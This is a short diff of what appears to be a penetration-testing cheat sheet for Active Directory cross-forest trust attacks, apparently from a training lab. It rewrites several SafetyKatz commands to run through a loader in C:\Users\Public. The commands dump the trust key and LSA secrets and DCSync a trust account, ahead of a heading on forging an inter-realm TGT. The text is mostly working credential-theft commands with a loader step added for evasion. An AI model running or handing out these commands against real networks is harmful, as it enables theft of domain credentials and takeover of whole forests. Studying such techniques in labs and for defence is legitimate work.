@@ -9,11 +9,11 @@ If you have Domain or Enterprise Admin in one forest you can pretty much automat
 
 Obtain Trust Key (as DA)
 ```powershell
-SafetyKatz.exe "lsadump::evasive-trust /patch"
+C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe "lsadump::evasive-trust /patch"
 
-.\Loader.exe -path .\SafetyKatz.exe "lsadump::evasive-dcsync /user:dcorp\ecorp$" "exit"
+C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe "lsadump::evasive-dcsync /user:dcorp\ecorp$" "exit"
 
-SafetyKatz.exe "lsadump::lsa /patch"
+C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe "lsadump::lsa /patch"
 ```
 
 Forge an inter-realm TGT
